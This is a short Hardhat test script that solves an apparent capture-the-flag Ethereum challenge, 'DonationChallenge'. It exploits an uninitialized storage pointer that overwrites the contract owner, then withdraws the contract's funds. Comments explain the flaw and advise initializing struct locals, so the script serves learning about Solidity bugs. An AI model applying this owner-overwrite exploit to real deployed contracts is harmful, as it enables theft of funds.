import crypto from "crypto";
import { ethers } from "hardhat";
import { BigNumber, Contract, Signer } from "ethers";
import { expect } from "chai";
import { formatEtherscanTx } from "../utils/format";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let contract: Contract; // challenge contract
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  const challengeFactory = await ethers.getContractFactory("DonationChallenge");
  contract = challengeFactory.attach(
    `0xd46Bf78494E6C15deE40Da3A89317433B263294d`
  );
});

it("solves the challenge", async function () {
  // Donation donation; is an uninitialized storage pointer
  // (used kind of like reference values in C++)
  // which means it point to storage cell 0 (donations)
  // when writing donation.etherAmount it sets storage[1] because etherAmount is
  // serialized as Donation's second var
  // https://blog.b9lab.com/storage-pointers-in-solidity-7dcfaa536089
  // always declare structs for local variables as storage or memory
  // and initialize them when declaring

  // need to choose etherAmount in a way such that it overwrites the owner with our
  // address, the scale is wrong as well and uses 10^36 which makes it exploitable
  const eoaAddress = BigNumber.from(await eoa.getAddress())
  tx = await contract.donate(eoaAddress.toString(), {
    value: eoaAddress
      .div(BigNumber.from(`10`).pow(`36`)),
  });
  await tx.wait();

  tx = await contract.withdraw();
  await tx.wait();

  

  const isComplete = await contract.isComplete();
  expect(isComplete).to.be.true;
});
